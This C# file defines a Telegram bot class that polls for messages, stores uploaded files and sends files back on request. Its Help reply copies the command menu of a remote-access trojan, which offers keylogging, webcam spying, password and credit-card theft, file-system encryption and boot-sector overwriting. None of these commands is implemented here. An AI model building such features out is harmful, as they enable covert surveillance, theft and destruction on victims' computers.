using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace JarPControlProject.Telegram;

public class TelegramBot
{
    // A field containing the bot's token to access the Telegram API
    private static String token;

    // Field containing the ID of the chat from which the commands will be received
    private long chatId;

    private TelegramBotClient botClient = null!;

    private Message message;


    public long ChatId
    {
        get => chatId;
        set => chatId = value;
    }

    public TelegramBotClient BotClient
    {
        get => botClient;
        set => botClient = value ?? throw new ArgumentNullException(nameof(value));
    }

    public Message Message
    {
        get => message;
        set => message = value ?? throw new ArgumentNullException(nameof(value));
    }

    public static string Token
    {
        get => token;
        set => token = value ?? throw new ArgumentNullException(nameof(value));
    }

    public TelegramBot(String token)
    {
        TelegramBot.token = token;
    }

    public async Task GetMessage() // authorization method
    {
        BotClient = new TelegramBotClient(Token);
        int offset = 0;
        int timeOut = 0;

        try
        {
            //позволяющий вашему боту получать обновления от мессенджера,
            //когда в ваш аккаунт приходят новые сообщения или события.
            //Ключове слово await в асинхронному програмуванні вказує,
            //код будет ждать, пока не будет завершено установление вебхука перед выполнением следующих команд.

            await BotClient.SetWebhookAsync("");

            while (true)
            {
                var updates = await BotClient.GetUpdatesAsync(offset, timeOut);

                foreach (var update in updates)
                {
                    message = update.Message; //we receive a message

                    if (message?.Text == "My message")
                    {
                        Console.WriteLine("Message: " + message);
                        await BotClient.SendTextMessageAsync(message.Chat.Id, "good job" + message.Chat.Username);
                    }

                    if (message!.Type == MessageType.Document)
                    {
                        await SendStoring.SaveFile(botClient, message);
                        await BotClient.SendTextMessageAsync(message.Chat.Id,
                            "good job file safe " + message.Chat.Username);
                    }

                    if (message.Text == "/getFiles")
                    {
                        await SendStoring.SendFile(botClient, message);
                        await BotClient.SendTextMessageAsync(message.Chat.Id,
                            "good job file sent " + message.Chat.Username);
                    }

                    offset = update.Id + 1;

                    if (message.Text == "Help")
                    {
                        await BotClient.SendTextMessageAsync(message.Chat.Id,
                            "\n 🌎 INFORMATION:" +
                            "\n /ComputerInfo" +
                            "\n /BatteryInfo" +
                            "\n /Location" +
                            "\n /Whois" +
                            "\n /ActiveWindow" +
                            "\n" +
                            "\n🎧 SPYING:" +
                            "\n /Webcam <camera> <delay>" +
                            "\n /Microphone <seconds>" +
                            "\n /Desktop" +
                            "\n /Keylogger" +
                            "\n" +
                            "\n📋 CLIPBOARD:" +
                            "\n /ClipboardSet <text>" +
                            "\n /ClipboardGet" +
                            "\n" +
                            "\n📊 TASKMANAGER:" +
                            "\n /ProcessList" +
                            "\n /ProcessKill <process>" +
                            "\n /ProcessStart <process>" +
                            "\n /TaskManagerDisable" +
                            "\n /TaskManagerEnable" +
                            "\n" +
                            "\n /MinimizeAllWindows" +
                            "\n /MaximizeAllWindows" +
                            "\n" +
                            "\n💳 STEALER:" +
                            "\n /GetPasswords" +
                            "\n /GetCreditCards" +
                            "\n /GetHistory" +
                            "\n /GetBookmarks" +
                            "\n /GetCookies" +
                            "\n /GetDesktop" +
                            "\n /GetFileZilla" +
                            "\n /GetDiscord" +
                            "\n /GetTelegram" +
                            "\n /GetSteam" +
                            "\n" +
                            "\n💿 CD-ROM:" +
                            "\n /OpenCD" +
                            "\n /CloseCD" +
                            "\n" +
                            "\n💼 FILES:" +
                            "\n /DownloadFile <file/dir>" +
                            "\n /UploadFile <drop/url>" +
                            "\n /RunFile <file>" +
                            "\n /RunFileAdmin <file>" +
                            "\n /ListFiles <dir>" +
                            "\n /RemoveFile <file>" +
                            "\n /RemoveDir <dir>" +
                            "\n /MoveFile <filr> <file>" +
                            "\n /CopyFile <file> <file>" +
                            "\n /MoveDir <dir> <dir>" +
                            "\n /CopyDir <dir> <dir>" +
                            "\n" +
                            "\n🚀 COMMUNICATION:" +
                            "\n /Speak <text>" +
                            "\n /Shell <command>" +
                            "\n /MessageBox <error/info/warn> <text>" +
                            "\n /OpenURL <url>" +
                            "\n /SetWallpaper <file>" +
                            "\n /SendKeyPress <keys>" +
                            "\n /NetDiscover <to>" +
                            "\n /Uninstall" +
                            "\n" +
                            "\n🔊 AUDIO: " +
                            "\n /PlayMusic <file>" +
                            "\n /AudioVolumeSet <0-100>" +
                            "\n /AudioVolumeGet" +
                            "\n" +
                            "\n💣 EVIL:" +
                            "\n /BlockInput <seconds>" +
                            "\n /Monitor <on/off/standby>" +
                            "\n /DisplayRotate <0,90,180,270>" +
                            "\n /EncryptFileSystem <password>" +
                            "\n /DecryptFileSystem <password>" +
                            "\n /ForkBomb" +
                            "\n /BSoD" +
                            "\n /OverwriteBootSector" +
                            "\n" +
                            "\n💡 POWER:" +
                            "\n /Shutdown" +
                            "\n /Reboot" +
                            "\n /Hibernate" +
                            "\n /Logoff" +
                            "\n" +
                            "\n💰 OTHER:" +
                            "\n /Help" +
                            "\n /About" +
                            "");
                    }

                    if (message.Text == "About")
                    {
                        await BotClient.SendTextMessageAsync(message.Chat.Id,
                            "\n🦠 SqeeZe" +
                            "\n👑 Coded by LimerBoy" +
                            "\n🔮 github.com/LimerBoy" +
                            "");
                    }
                }
            }
        }
        catch (Exception e) //логери потім добав або як у Макса
        {
            Console.WriteLine("Error" + e);
            throw;
        }
    }
}